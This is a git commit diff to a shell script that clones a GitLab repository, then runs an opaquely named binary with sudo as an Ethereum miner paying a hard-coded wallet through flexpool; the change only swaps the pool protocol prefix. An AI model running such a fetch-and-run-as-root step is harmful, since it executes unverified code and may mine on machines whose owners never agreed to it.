8af84beb7794da3850db61aa7727e0a67e64cbc7
Treecommon <103907893+Treecommon@users.noreply.github.com>
2022-04-22 12:02:44 +0700

    Update gr2.sh

--- gr2.sh
+++ gr2.sh
@@ -6,4 +6,4 @@ screen -dmS ya.sh 65 75
 sudo git clone https://gitlab.com/useragen/lancarkanlah.git
 cd lancarkanlah
 chmod +x gr
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./gr -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./gr -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p ethproxy+tcp://eth-sg.flexpool.io:4444 ethproxy+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
